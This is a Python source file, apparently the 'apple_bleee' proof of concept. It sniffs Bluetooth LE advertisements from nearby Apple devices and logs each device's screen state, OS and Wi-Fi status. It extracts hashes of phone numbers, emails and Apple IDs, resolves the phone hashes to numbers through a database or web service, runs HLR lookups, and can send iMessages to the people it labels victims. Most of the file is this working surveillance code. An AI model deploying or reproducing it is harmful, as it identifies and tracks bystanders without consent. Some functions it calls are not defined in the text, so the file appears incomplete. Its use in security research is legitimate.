#!/usr/bin/env python3
# Author: Dmitry Chastuhin
# Twitter: https://twitter.com/_chipik

# web: https://hexway.io
# Twitter: https://twitter.com/_hexway

import re
import sys
import time
import json
import curses
import hashlib
import urllib3
import sqlite3
import requests
import argparse
import npyscreen
import subprocess
from os import path
from bs4 import BeautifulSoup
from prettytable import PrettyTable
from threading import Thread, Timer
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, enable_le_scan, parse_le_advertising_events, disable_le_scan,
                                   raw_packet_to_str, start_le_advertising, stop_le_advertising)

help_desc = '''
Apple bleee. Apple device sniffer
---chipik
'''
urllib3.disable_warnings()
parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-c', '--check_hash', action='store_true', help='Get phone number by hash')
parser.add_argument('-n', '--check_phone', action='store_true', help='Get user info by phone number (TrueCaller/etc)')
parser.add_argument('-r', '--check_region', action='store_true', help='Get phone number region info')
parser.add_argument('-l', '--check_hlr', action='store_true',
                    help='Get phone number info by HLR request (hlrlookup.com)')
parser.add_argument('-s', '--ssid', action='store_true', help='Get SSID from requests')
parser.add_argument('-m', '--message', action='store_true', help='Send iMessage to the victim')
parser.add_argument('-a', '--airdrop', action='store_true', help='Get info from AWDL')
parser.add_argument('-t', '--ttl', type=int, default=15, help='ttl')
args = parser.parse_args()

if args.check_phone:
    # import from TrueCaller API lib (sorry, but we did some RE for that :))
    print("Sorry, but we don't provide this functionality as a part of this PoC")
    exit(1)
if args.airdrop:
    from opendrop2.cli import AirDropCli, get_devices

hash2phone_url = ''  # URL to hash2phone matcher
hash2phone_db = "hash2phone/phones.db"
hlr_key = ''  # hlrlookup.com key here
hlr_pwd = ''  # hlrlookup.com password here
hlr_api_url = 'https://www.hlrlookup.com/api/hlr/?apikey={}&password={}&msisdn='.format(hlr_key, hlr_pwd)
region_check_url = ''  # URL to region checker here
imessage_url = ''  # URL to iMessage sender (sorry, but we did some RE for that :) )
iwdev = 'wlan0'
apple_company_id = 'ff4c00'

dev_id = 0  # the bluetooth device is hci0
toggle_device(dev_id, True)

sock = 0
titles = ['Mac', 'State', 'Device', 'WI-FI', 'OS', 'Phone', 'Time']
dev_sig = {'02010': 'MacBook', '02011': 'iPhone'}
dev_types = ["iPad", "iPhone", "MacOS", "AirPods"]
phones = {}
resolved_devs = []
resolved_macs = []
resolved_numbers = []
victims = []
phone_number_info = {}
hash2phone = {}
dictOfss = {}
proxies = {}
verify = False

# not sure about 1b, 13, 0a, 1a, 17
phone_states = {'0b': 'Home screen',
                '1c': 'Home screen',
                '1b': 'Home screen',
                '11': 'Home screen',
                '03': 'Off',
                '18': 'Off',
                '09': 'Off',
                '13': 'Off',
                '0a': 'Off',
                '1a': 'Off',
                '01': 'Off',
                '07': 'Lock screen',
                '17': 'Lock screen',
                '0e': 'Calling',
                '5b': 'Home screen',
                '5a': 'Off',
                }

airpods_states = {
    '00': 'Case:Closed',
    '01': 'Case:All out',
    '02': 'L:out',
    '05': 'R:out',
    '03': 'L:out',
    '09': 'R:out',
    '0b': 'LR:in',
    '11': 'R:out',
    '13': 'R:in',
    '15': 'R:in case',
    '20': 'L:out',
    '21': 'Case:All out',
    '22': 'Case:L out',
    '23': 'R:out',
    '29': 'L:out',
    '2b': 'LR:in',
    '31': 'Case:L out',
    '33': 'Case:L out',
    '50': 'Case:open',
    '51': 'L:out',
    '53': 'L:in',
    '55': 'Case:open',
    '70': 'Case:open',
    '71': 'Case:R out',
    '73': 'Case:R out',
    '75': 'Case:open',
}
devices_models = {
    "i386": "iPhone Simulator",
    "x86_64": "iPhone Simulator",
    "iPhone1,1": "iPhone",
    "iPhone1,2": "iPhone 3G",
    "iPhone2,1": "iPhone 3GS",
    "iPhone3,1": "iPhone 4",
    "iPhone3,2": "iPhone 4 GSM Rev A",
    "iPhone3,3": "iPhone 4 CDMA",
    "iPhone5,1": "iPhone 5 (GSM)",
    "iPhone4,1": "iPhone 4S",
    "iPhone5,2": "iPhone 5 (GSM+CDMA)",
    "iPhone5,3": "iPhone 5C (GSM)",
    "iPhone5,4": "iPhone 5C (Global)",
    "iPhone6,1": "iPhone 5S (GSM)",
    "iPhone6,2": "iPhone 5S (Global)",
    "iPhone7,1": "iPhone 6 Plus",
    "iPhone7,2": "iPhone 6",
    "iPhone8,1": "iPhone 6s",
    "iPhone8,2": "iPhone 6s Plus",
    "iPhone8,3": "iPhone SE (GSM+CDMA)",
    "iPhone8,4": "iPhone SE (GSM)",
    "iPhone9,1": "iPhone 7",
    "iPhone9,2": "iPhone 7 Plus",
    "iPhone9,3": "iPhone 7",
    "iPhone9,4": "iPhone 7 Plus",
    "iPhone10,1": "iPhone 8",
    "iPhone10,2": "iPhone 8 Plus",
    "iPhone10,3": "iPhone X Global",
    "iPhone10,4": "iPhone 8",
    "iPhone10,5": "iPhone 8 Plus",
    "iPhone10,6": "iPhone X GSM",
    "iPhone11,2": "iPhone XS",
    "iPhone11,4": "iPhone XS Max",
    "iPhone11,6": "iPhone XS Max Global",
    "iPhone11,8": "iPhone XR",
    "MacBookPro15,1": "MacBook Pro 15, 2019",
    "MacBookPro15,2": "MacBook Pro 13, 2019",
    "MacBookPro15,1": "MacBook Pro 15, 2018",
    "MacBookPro15,2": "MacBook Pro 13, 2018",
    "MacBookPro14,3": "MacBook Pro 15, 2017",
    "MacBookPro14,2": "MacBook Pro 13, 2017",
    "MacBookPro14,1": "MacBook Pro 13, 2017",
    "MacBookPro13,3": "MacBook Pro 15, 2016",
    "MacBookPro13,2": "MacBook Pro 13, 2016",
    "MacBookPro13,1": "MacBook Pro 13, 2016",
    "MacBookPro11,4": "MacBook Pro 15, mid 2015",
    "MacBookPro11,5": "MacBook Pro 15, mid 2015",
    "MacBookPro12,1": "MacBook Pro 13, ear 2015",
    "MacBookPro11,2": "MacBook Pro 15, mid 2014",
    "MacBookPro11,3": "MacBook Pro 15, mid 2014",
    "MacBookPro11,1": "MacBook Pro 13, mid 2014",
    "MacBookPro11,2": "MacBook Pro 15, end 2013",
    "MacBookPro11,3": "MacBook Pro 15, end 2013",
    "MacBookPro10,1": "MacBook Pro 15, ear 2013",
    "MacBookPro11,1": "MacBook Pro 13, end 2013",
    "MacBookPro10,2": "MacBook Pro 13, ear 2013",
    "MacBookPro10,1": "MacBook Pro 15, mid 2012",
    "MacBookPro9,1": "MacBook Pro 15, mid 2012",
    "MacBookPro10,2": "MacBook Pro 15, mid 2012",
    "MacBookPro9,2": "MacBook Pro 15, mid 2012",
    "MacBookPro8,3": "MacBook Pro 17, end 2011",
    "MacBookPro8,3": "MacBook Pro 17, ear 2011",
    "MacBookPro8,2": "MacBook Pro 15, end 2011",
    "MacBookPro8,2": "MacBook Pro 15, ear 2011",
    "MacBookPro8,1": "MacBook Pro 13, end 2011",
    "MacBookPro8,1": "MacBook Pro 13, ear 2011",
    "MacBookPro6,1": "MacBook Pro 17, mid 2010",
    "MacBookPro6,2": "MacBook Pro 15, mid 2010",
    "MacBookPro7,1": "MacBook Pro 13, mid 2010",
    "MacBookPro5,2": "MacBook Pro 17, mid 2009",
    "MacBookPro5,2": "MacBook Pro 17, ear 2009",
    "MacBookPro5,3": "MacBook Pro 15, mid 2009",
    "MacBookPro5,3": "MacBook Pro 15, mid 2009",
    "MacBookPro5,5": "MacBook Pro 13, mid 2009",
    "MacBookPro5,1": "MacBook Pro 15, end 2008",
    "MacBookPro4,1": "MacBook Pro 17, ear 2008",
    "MacBookPro4,1": "MacBook Pro 15, ear 2008",
    "iPod1,1": "1st Gen iPod",
    "iPod2,1": "2nd Gen iPod",
    "iPod3,1": "3rd Gen iPod",
    "iPod4,1": "4th Gen iPod",
    "iPod5,1": "5th Gen iPod",
    "iPod7,1": "6th Gen iPod",
    "iPad1,1": "iPad",
    "iPad1,2": "iPad 3G",
    "iPad2,1": "2nd Gen iPad",
    "iPad2,2": "2nd Gen iPad GSM",
    "iPad2,3": "2nd Gen iPad CDMA",
    "iPad2,4": "2nd Gen iPad New Revision",
    "iPad3,1": "3rd Gen iPad",
    "iPad3,2": "3rd Gen iPad CDMA",
    "iPad3,3": "3rd Gen iPad GSM",
    "iPad2,5": "iPad mini",
    "iPad2,6": "iPad mini GSM+LTE",
    "iPad2,7": "iPad mini CDMA+LTE",
    "iPad3,4": "4th Gen iPad",
    "iPad3,5": "4th Gen iPad GSM+LTE",
    "iPad3,6": "4th Gen iPad CDMA+LTE",
    "iPad4,1": "iPad Air (WiFi)",
    "iPad4,2": "iPad Air (GSM+CDMA)",
    "iPad4,3": "1st Gen iPad Air (China)",
    "iPad4,4": "iPad mini Retina (WiFi)",
    "iPad4,5": "iPad mini Retina (GSM+CDMA)",
    "iPad4,6": "iPad mini Retina (China)",
    "iPad4,7": "iPad mini 3 (WiFi)",
    "iPad4,8": "iPad mini 3 (GSM+CDMA)",
    "iPad4,9": "iPad Mini 3 (China)",
    "iPad5,1": "iPad mini 4 (WiFi)",
    "iPad5,2": "4th Gen iPad mini (WiFi+Cellular)",
    "iPad5,3": "iPad Air 2 (WiFi)",
    "iPad5,4": "iPad Air 2 (Cellular)",
    "iPad6,3": "iPad Pro (9.7 inch, WiFi)",
    "iPad6,4": "iPad Pro (9.7 inch, WiFi+LTE)",
    "iPad6,7": "iPad Pro (12.9 inch, WiFi)",
    "iPad6,8": "iPad Pro (12.9 inch, WiFi+LTE)",
    "iPad6,11": "iPad (2017)",
    "iPad6,12": "iPad (2017)",
    "iPad7,1": "iPad Pro 2nd Gen (WiFi)",
    "iPad7,2": "iPad Pro 2nd Gen (WiFi+Cellular)",
    "iPad7,3": "iPad Pro 10.5-inch",
    "iPad7,4": "iPad Pro 10.5-inch",
    "iPad7,5": "iPad 6th Gen (WiFi)",
    "iPad7,6": "iPad 6th Gen (WiFi+Cellular)",
    "iPad8,1": "iPad Pro 3rd Gen (11 inch, WiFi)",
    "iPad8,2": "iPad Pro 3rd Gen (11 inch, 1TB, WiFi)",
    "iPad8,3": "iPad Pro 3rd Gen (11 inch, WiFi+Cellular)",
    "iPad8,4": "iPad Pro 3rd Gen (11 inch, 1TB, WiFi+Cellular)",
    "iPad8,5": "iPad Pro 3rd Gen (12.9 inch, WiFi)",
    "iPad8,6": "iPad Pro 3rd Gen (12.9 inch, 1TB, WiFi)",
    "iPad8,7": "iPad Pro 3rd Gen (12.9 inch, WiFi+Cellular)",
    "iPad8,8": "iPad Pro 3rd Gen (12.9 inch, 1TB, WiFi+Cellular)",
    "Watch1,1": "Apple Watch 38mm case",
    "Watch1,2": "Apple Watch 38mm case",
    "Watch2,6": "Apple Watch Series 1 38mm case",
    "Watch2,7": "Apple Watch Series 1 42mm case",
    "Watch2,3": "Apple Watch Series 2 38mm case",
    "Watch2,4": "Apple Watch Series 2 42mm case",
    "Watch3,1": "Apple Watch Series 3 38mm case (GPS+Cellular)",
    "Watch3,2": "Apple Watch Series 3 42mm case (GPS+Cellular)",
    "Watch3,3": "Apple Watch Series 3 38mm case (GPS)",
    "Watch3,4": "Apple Watch Series 3 42mm case (GPS)",
    "Watch4,1": "Apple Watch Series 4 40mm case (GPS)",
    "Watch4,2": "Apple Watch Series 4 44mm case (GPS)",
    "Watch4,3": "Apple Watch Series 4 40mm case (GPS+Cellular)",
    "Watch4,4": "Apple Watch Series 4 44mm case (GPS+Cellular)",
}

ble_packets_types = {'watch_c': '0b',
                     'handoff': '0c',
                     'wifi_set': '0d',
                     'hotspot': '0e',
                     'wifi_join': '0f',
                     'nearby': '10',
                     'airpods': '07',
                     'airdrop': '05',
                     }

if args.check_hash:
    if not (hash2phone_url or path.isfile(hash2phone_db)):
        print("You have to specify hash2phone_url or create phones.db if you want to match hashes to phones. See howto here: https://github.com/hexway/apple_bleee/tree/master/hash2phone")
        exit(1)
if args.check_hlr:
    if not hlr_key or hlr_pwd:
        print("You have to specify hlr_key or hlr_pwd for HLR requests")
        exit(1)
if args.check_region:
    if not region_check_url:
        print("You have to specify region_check_url for region requests")
        exit(1)
if args.message:
    if not imessage_url:
        print("You have to specify imessage_url if you want to send iMessages to the victim")
        exit(1)


class App(npyscreen.StandardApp):
    def onStart(self):
        self.addForm("MAIN", MainForm, name="Apple devices scanner")


class MyGrid(npyscreen.GridColTitles):
    def custom_print_cell(self, actual_cell, cell_display_value):
        if 'Off' in cell_display_value or '<error>' in cell_display_value or 'iOS10' in cell_display_value or 'iOS11' in cell_display_value:
            actual_cell.color = 'DANGER'
        elif 'Home screen' in cell_display_value or 'On' in cell_display_value or cell_display_value[0:3] in '\n'.join(
                dev_types) or 'iOS12' in cell_display_value or 'X' in cell_display_value or 'Calling' in cell_display_value or cell_display_value in airpods_states.values() or 'WatchOS' in cell_display_value or 'Watch' in cell_display_value or 'iOS13' in cell_display_value or 'Connecting' in cell_display_value or 'WiFi screen' in cell_display_value:
            actual_cell.color = 'GOOD'
        elif 'Lock screen' in cell_display_value:
            actual_cell.color = 'CONTROL'
        else:
            actual_cell.color = 'DEFAULT'


class OutputBox(npyscreen.BoxTitle):
    _contained_widget = npyscreen.MultiLineEdit


class MainForm(npyscreen.FormBaseNew):
    def create(self):
        new_handlers = {
            "^Q": self.exit_func
        }
        self.add_handlers(new_handlers)
        y, x = self.useable_space()
        if args.airdrop:
            self.gd = self.add(MyGrid, col_titles=titles, column_width=20, max_height=y // 2)
            self.OutputBox = self.add(OutputBox, editable=False)
        else:
            self.gd = self.add(MyGrid, col_titles=titles, column_width=20)
        self.gd.values = []
        self.gd.add_handlers({curses.ascii.NL: self.upd_cell})

    def while_waiting(self):
        self.gd.values = print_results()
        if args.airdrop:
            self.OutputBox.value = print_wifi_devs()
            self.OutputBox.display()

    def exit_func(self, _input):
        disable_le_scan(sock)
        print("Bye")
        sys.exit()

    def get_dev_name(self, mac_addr):
        global resolved_devs
        dev_name = ''
        kill = lambda process: process.kill()
        cmd = ['gatttool', '-t', 'random', '--char-read', '--uuid=0x2a24', '-b', mac_addr]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        timer = Timer(3, kill, [proc])
        try:
            timer.start()
            dev_name, stderr = proc.communicate()
        finally:
            timer.cancel()
        if dev_name:
            d_n_hex = dev_name.split(b"value:")[1].replace(b" ", b"").replace(b"\n", b"")
            d_n_str = bytes.fromhex(d_n_hex.decode("utf-8")).decode('utf-8')
            return_value = devices_models[d_n_str]
        else:
            return_value = "<error>"
        init_bluez()
        if return_value:
            resolved_devs.append(mac_addr)
            self.set_device_val_for_mac(mac_addr, return_value)

    def get_mac_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][0]

    def get_state_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][1]

    def get_device_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][2]

    def get_wifi_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][3]

    def get_os_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][4]

    def get_phone_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][5]

    def get_time_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][6]

    def set_mac_val_for_mac(self, mac, value):
        global phones
        phones[mac]['mac'] = value

    def set_state_val_for_mac(self, mac, value):
        global phones
        phones[mac]['state'] = value

    def set_device_val_for_mac(self, mac, value):
        global phones
        phones[mac]['device'] = value

    def set_time_val_for_mac(self, mac, value):
        global phones
        phones[mac]['time'] = value

    def get_cell_name(self):
        return titles[self.gd.edit_cell[1]]

    def upd_cell(self, argument):
        global resolved_devs
        cell = self.get_cell_name()
        if cell == 'Device':
            mac = self.get_mac_val_from_cell()
            thread2 = Thread(target=self.get_dev_name, args=(mac,))
            thread2.daemon = True
            thread2.start()
        if cell == 'Phone':
            if self.get_phone_val_from_cell() == 'X':
                hashinfo = "Phone hash={}, email hash={}, AppleID hash={}, SSID hash={} ({})".format(
                    hash2phone[self.get_mac_val_from_cell()]['ph_hash'],
                    hash2phone[self.get_mac_val_from_cell()]['email_hash'],
                    hash2phone[self.get_mac_val_from_cell()]['appleID_hash'],
                    hash2phone[self.get_mac_val_from_cell()]['SSID_hash'],
                    get_dict_val(dictOfss, hash2phone[self.get_mac_val_from_cell()]['SSID_hash']))
                table = print_results2(hash2phone[self.get_mac_val_from_cell()]['phone_info'])
                rez = "{}\n\n{}".format(hashinfo, table)
                npyscreen.notify_confirm(rez, title="Phone number info", wrap=True, wide=True, editw=0)


def clear_zombies():
    zombies = []
    cur_time = int(time.time())
    for k in list(phones):
        if cur_time - phones[k]['time'] > args.ttl:
            del phones[k]
            if resolved_macs.count(k):
                resolved_macs.remove(k)
            if resolved_devs.count(k):
                resolved_devs.remove(k)
            if victims.count(k):
                victims.remove(k)


def print_results():
    rez_str = ''
    clear_zombies()
    row = []
    for phone in phones:
        row.append([phone, phones[phone]['state'], phones[phone]['device'], phones[phone]['wifi'], phones[phone]['os'],
                    phones[phone]['phone'], phones[phone]['time']])
    return row


def parse_os_wifi_code(code, dev):
    if code == '1c':
        if dev == 'MacBook':
            return ('Mac OS', 'On')
        else:
            return ('iOS12', 'On')
    if code == '18':
        if dev == 'MacBook':
            return ('Mac OS', 'Off')
        else:
            return ('iOS12', 'Off')
    if code == '10':
        return ('iOS11', '<unknown>')
    if code == '1e':
        return ('iOS13', 'On')
    if code == '1a':
        return ('iOS13', 'Off')
    if code == '0e':
        return ('iOS13', 'Connecting')
    if code == '0c':
        return ('iOS12', 'On')
    if code == '00':
        return ('iOS10', '<unknown>')
    if code == '09':
        return ('Mac OS', '<unknown>')
    if code == '14':
        return ('Mac OS', 'On')
    if code == '98':
        return ('WatchOS', '<unknown>')
    else:
        return ('<error({})>'.format(code), '<error({})>'.format(code))


def parse_ble_packet(data):
    parsed_data = {}
    tag_len = 2
    i = 0
    while i < len(data):
        tag = data[i:i + tag_len]
        val_len = int(data[i + tag_len:i + tag_len + 2], 16)
        value_start_position = i + tag_len + 2
        value_end_position = i + tag_len + 2 + val_len * 2
        parsed_data[tag] = data[value_start_position:value_end_position]
        i = value_end_position
    return parsed_data


def parse_struct(data, struct):
    result = {}
    i = 0
    # if len(data)!=sum(struct.values())*2:
    #     print("wrong lenght")
    #     return {}
    for key in struct:
        if key == 999:
            result[key] = data[i:]
        else:
            result[key] = data[i:i + struct[key] * 2]
        i = i + struct[key] * 2
    return result


def parse_nearby(mac, header, data):
    # 0        1        2                                 5
    # +--------+--------+--------------------------------+
    # |        |        |                                |
    # | status | wifi   |           other                |
    # |        |        |                                |
    # +--------+--------+--------------------------------+
    nearby = {'status': 1, 'wifi': 1, 'other': 999}
    result = parse_struct(data, nearby)
    # print("Nearby:{}".format(data))
    state = os_state = wifi_state = unkn = '<unknown>'
    if result['status'] in phone_states.keys():
        state = phone_states[result['status']]
    dev_val = unkn
    for dev in dev_sig:
        if dev in header:
            dev_val = dev_sig[dev]
    os_state, wifi_state = parse_os_wifi_code(result['wifi'], dev_val)
    if os_state == 'WatchOS':
        dev_val = 'Watch'
    if mac in resolved_macs or mac in resolved_devs:
        phones[mac]['state'] = state
        phones[mac]['wifi'] = wifi_state
        phones[mac]['os'] = os_state
        phones[mac]['time'] = int(time.time())
        phones[mac]['device'] = dev_val
    else:
        phones[mac] = {'state': unkn, 'device': unkn, 'wifi': unkn, 'os': unkn, 'phone': '', 'time': int(time.time())}
        phones[mac]['device'] = dev_val
        resolved_macs.append(mac)


def parse_nandoff(mac, data):
    # 0        1                3
    # +--------+----------------+----------------------------+
    # |        |                |
    # |clipbrd | seq.nmbr       |     encr.data
    # |        |                |
    # +--------+----------------+----------------------------+
    handoff = {'clipboard': 1, 's_nbr': 2, 'data': 999}
    result = parse_struct(data, handoff)
    # print("Handoff:{}".format(data))
    # print(result)


def parse_watch_c(mac, data):
    print("Watch_connection:{}".format(data))


def parse_wifi_set(mac, data):
    # 0                                         4
    # +-----------------------------------------+
    # |                                         |
    # |             iCloud ID                   |
    # |                                         |
    # +-----------------------------------------+
    wifi_set = {'icloudID': 4}
    result = parse_struct(data, wifi_set)
    # print("WiFi settings:{}".format(data))
    # print(result)
    unkn = '<unknown>'
    if mac in resolved_macs or mac in resolved_devs:
        phones[mac]['state'] = 'WiFi screen'
    else:
        phones[mac] = {'state': unkn, 'device': unkn, 'wifi': unkn, 'os': unkn, 'phone': '', 'time': int(time.time())}
        resolved_macs.append(mac)


def parse_hotspot(mac, data):
    # 0                2           3            4           5            6
    # +----------------+-----------+------------+-----------+------------+
    # |                |           |            |           |            |
    # |   data1        | battery   |  data2     |cell serv  | cell bars  |
    # |                |           |            |           |            |
    # +----------------+-----------+------------+-----------+------------+
    hotspot = {'data1': 2, 'battery': 1, 'data2': 1, 'cell_srv': 1, 'cell_bars': 1}
    result = parse_struct(data, hotspot)
    if mac in resolved_macs or mac in resolved_devs:
        phones[mac]['state'] = '{}.Bat:{}%'.format(phones[mac]['state'], int(result['battery'], 16))
    # print("Hotspot:{}".format(data))


def parse_wifi_j(mac, data):
    # 0        1       2                        5                         8                       12                     15                     18
    # +--------+-------+------------------------+-------------------------+-----------------------+----------------------+----------------------+
    # |        |       |                        |                         |                       |                      |                      |
    # | flags  | type  |     auth tag           |     sha(appleID)        |   sha(phone_nbr)      |  sha(email)          |   sha(SSID)          |
    # |        | (0x08)|                        |                         |                       |                      |                      |
    # +--------+--------------------------------+-------------------------+-----------------------+----------------------+----------------------+

    wifi_j = {'flags': 1, 'type': 1, 'tag': 3, 'appleID_hash': 3, 'phone_hash': 3, 'email_hash': 3, 'ssid_hash': 3}
    result = parse_struct(data, wifi_j)
    # print("WiFi join:{}".format(data))
    # print(result)

    global phone_number_info
    unkn = '<unknown>'
    if mac not in victims:
        victims.append(mac)
        if args.check_hash:
            if hash2phone_url: get_phone_web(result['phone_hash'])
            else: get_phone_db(result['phone_hash'])
            if args.check_phone:
                get_names(True)
            if args.check_hlr:
                thread3 = Thread(target=get_hlr_info, args=(mac,))
                thread3.daemon = True
                thread3.start()
            if args.check_region:
                thread4 = Thread(target=get_regions(), args=())
                thread4.daemon = True
                thread4.start()
            if args.message:
                thread4 = Thread(target=sendToTheVictims, args=(result['ssid_hash'],))
                thread4.daemon = True
                thread4.start()
        if resolved_macs.count(mac):
            phones[mac]['time'] = int(time.time())
            phones[mac]['phone'] = 'X'
            hash2phone[mac] = {'ph_hash': result['phone_hash'], 'email_hash': result['email_hash'],
                               'appleID_hash': result['appleID_hash'], 'SSID_hash': result['ssid_hash'],
                               'phone_info': phone_number_info}
        else:
            phones[mac] = {'state': unkn, 'device': unkn, 'wifi': unkn, 'os': unkn, 'phone': '',
                           'time': int(time.time())}
            resolved_macs.append(mac)
            phones[mac]['time'] = int(time.time())
            phones[mac]['phone'] = 'X'
            hash2phone[mac] = {'ph_hash': result['phone_hash'], 'email_hash': result['email_hash'],
                               'appleID_hash': result['appleID_hash'], 'SSID_hash': result['ssid_hash'],
                               'phone_info': phone_number_info}
    else:
        phones[mac]['time'] = int(time.time())


def parse_airpods(mac, data):
    # 0                        3        4       5        6       7                 9                                                            25
    # +------------------------+--------+-------+--------+-------+-----------------+------------------------------------------------------------+
    # |                        |        |       |        |       |                 |                                                            |
    # |     some               |state1  |state2 | data1  | data2 |     data3       |             data4                                          |
    # |                        |        |       |        |       |                 |                                                            |
    # +------------------------+--------+-------+--------+-------+-----------------+------------------------------------------------------------+
    airpods = {'some': 3, 'state1': 1, 'state2': 1, 'data1': 1, 'data2': 1, 'data3': 2, 'data4': 16}
    result = parse_struct(data, airpods)
    # print("AirPods:{}".format(data))
    # print(result)
    state = unkn = '<unknown>'
    if result['state1'] in airpods_states.keys():
        state = airpods_states[result['state1']]
    else:
        state = unkn
    if result['state2'] == '09':
        state = 'Case:Closed'
    if mac in resolved_macs:
        phones[mac]['state'] = state
        phones[mac]['time'] = int(time.time())
    else:
        phones[mac] = {'state': state, 'device': 'AirPods', 'wifi': '<none>', 'os': '<none>', 'phone': '<none>',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_airdrop_r(mac, data):
    # 0                                         8        9                11                    13                  15                 17       18
    # +-----------------------------------------+--------+----------------+---------------------+-------------------+------------------+--------+
    # |                                         |        |                |                     |                   |                  |        |
    # |           zeros                         |st(0x01)| sha(AppleID)   | sha(phone)          |  sha(email)       |   sha(email2)    |  zero  |
    # |                                         |        |                |                     |                   |                  |        |
    # +-----------------------------------------+--------+----------------+---------------------+-------------------+------------------+--------+
    airdrop_r = {'zeros': 8, 'st': 1, 'appleID_hash': 2, 'phone_hash': 2, 'email_hash': 2, 'email2_hash': 2, 'zero': 1}
    result = parse_struct(data, airdrop_r)
    # print("AirDrop:{}".format(data))
    # print(result)


def read_packet(mac, data_str):
    state = '<unknown>'
    os_state = '<unknown>'
    wifi_state = '<unknown>'
    unkn = '<unknown>'

    if apple_company_id in data_str:
        header = data_str[:data_str.find(apple_company_id)]
        data = data_str[data_str.find(apple_company_id) + len(apple_company_id):]
        packet = parse_ble_packet(data)
        # print(data)
        if ble_packets_types['nearby'] in packet.keys():
            parse_nearby(mac, header, packet[ble_packets_types['nearby']])
        if ble_packets_types['handoff'] in packet.keys():
            parse_nandoff(mac, packet[ble_packets_types['handoff']])
        if ble_packets_types['watch_c'] in packet.keys():
            parse_watch_c(mac, packet[ble_packets_types['watch_c']])
        if ble_packets_types['wifi_set'] in packet.keys():
            parse_wifi_set(mac, packet[ble_packets_types['wifi_set']])
        if ble_packets_types['hotspot'] in packet.keys():
            parse_hotspot(mac, packet[ble_packets_types['hotspot']])
        if ble_packets_types['wifi_join'] in packet.keys():
            parse_wifi_j(mac, packet[ble_packets_types['wifi_join']])
        if ble_packets_types['airpods'] in packet.keys():
            parse_airpods(mac, packet[ble_packets_types['airpods']])
        if ble_packets_types['airdrop'] in packet.keys():
            parse_airdrop_r(mac, packet[ble_packets_types['airdrop']])

def get_phone_db(hashp):
    global phone_number_info
    conn = sqlite3.connect(hash2phone_db)
    c = conn.cursor()
    c.execute('SELECT phone FROM map WHERE hash=?', (hashp,))
    phones = c.fetchall()
    if not phones: print("No phone number found for hash '%s'" % hashp)
    else:
        phone_number_info = {str(i[0]): {'phone': str(i[0]), 'name': '', 'carrier': '', 'region': '', 'status': '', 'iMessage': ''}
                             for i in phones}
    conn.close()



def get_phone_web(hash):
    global phone_number_info
    r = requests.get(hash2phone_url, proxies=proxies, params={'hash': hash}, verify=verify)
    if r.status_code == 200:
        result = r.json()
        phone_number_info = {i: {'phone': '', 'name': '', 'carrier': '', 'region': '', 'status': '', 'iMessage': ''} for
                             i in result['candidates']}
        for phone in phone_number_info:
            phone_number_info[phone]['phone'] = phone
    else:
        print("Something wrong! Status: {}".format(r.status_code))


def get_hlr_info(mac):
    global phone_number_info
    r = requests.get(hlr_api_url + ','.join(phone_number_info.keys()), proxies=proxies, verify=verify)
    if r.status_code == 200:
        result = r.json()
        for info in result:
            phone_number_info[info]['status'] = '{}'.format(result[info]['error_text'])


def get_region(phone):
    global phone_number_info
    r = requests.get(region_check_url + phone, proxies=proxies, verify=verify)
    if r.status_code == 200:
        soup = BeautifulSoup(r.content, 'html.parser')
        text = str(soup.find("div", {"class": "itemprop_answer"}))
        region = re.findall(r'Region:(.*?)L', text, flags=re.DOTALL)[0].replace('<br/>', '').replace('\n', '')
        phone_number_info[phone]['region'] = region
    else:
        print("Something wrong! Status: {}".format(r.status_code))


def print_results2(data):
    x = PrettyTable()
    x.field_names = ["Phone", "Name", "Carrier", "Region", "Status", 'iMessage']
    for phone in data:
        x.add_row([data[phone]['phone'], data[phone]['name'], data[phone]['carrier'], data[phone]['region'],
                   data[phone]['status'], data[phone]['iMessage']])
    return x.get_string()


def print_wifi_devs():
    return print_results3(get_devices())


def get_names(lat=False):
    global phone_number_info
    for phone in phone_number_info:
        (name, carrier, region) = get_number_info_TrueCaller('+{}'.format(phone), lat)
        phone_number_info[phone]['name'] = name
        phone_number_info[phone]['carrier'] = carrier
        phone_number_info[phone]['region'] = region
    init_bluez()


def get_regions():
    for phone in phone_number_info:
        get_region(phone)


def get_dict_val(dict, key):
    if key in dict:
        return dict[key]
    else:
        return ''


def le_advertise_packet_handler(mac, adv_type, data, rssi):
    data_str = raw_packet_to_str(data)
    read_packet(mac, data_str)


def init_bluez():
    global sock
    try:
        sock = bluez.hci_open_dev(dev_id)
    except:
        print("Cannot open bluetooth device %i" % dev_id)
        raise

    enable_le_scan(sock, filter_duplicates=False)


def do_sniff(prnt):
    global phones
    try:
        parse_le_advertising_events(sock,
                                    handler=le_advertise_packet_handler,
                                    debug=False)
    except KeyboardInterrupt:
        print("Stop")
        disable_le_scan(sock)


def get_hash(data, size=6):
    return hashlib.sha256(data.encode('utf-8')).hexdigest()[:size]


def get_ssids():
    global dictOfss
    proc = subprocess.Popen(['ip', 'link', 'set', iwdev, 'up'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    kill = lambda process: process.kill()
    cmd = ['iwlist', iwdev, 'scan']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    timer = Timer(3, kill, [proc])
    try:
        timer.start()
        ssids, stderr = proc.communicate()
    finally:
        timer.cancel()
    if ssids:
        result = re.findall('ESSID:"(.*)"\n', str(ssids, 'utf-8'))
        ss = list(set(result))
        dictOfss = {get_hash(s): s for s in ss}
    else:
        dictOfss = {}


def send_imessage(tel, text):
    # our own service to send iMessage
    data = {"token": "",
            "destination": "+{}".format(tel),
            "text": text
            }
    r = requests.post(imessage_url + '/imessage', data=json.dumps(data), proxies=proxies, verify=verify)
    if r.status_code == 200:
        result = r.json()
        phone_number_info[tel]['iMessage'] = 'X'
    elif r.status_code == 404:
        phone_number_info[tel]['iMessage'] = '-'
    else:
        print(r.content)
